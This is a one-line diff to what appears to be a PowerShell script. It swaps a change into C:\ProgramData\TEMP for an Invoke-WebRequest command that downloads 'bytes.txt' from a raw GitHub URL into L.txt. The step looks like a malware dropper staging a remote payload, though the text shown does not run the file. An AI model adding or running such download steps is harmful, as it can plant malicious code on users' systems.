@@ -1,1 +1,1 @@
-cd C:\ProgramData\TEMP
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Lucca-stak/linl/main/bytes.txt' -OutFile L.txt
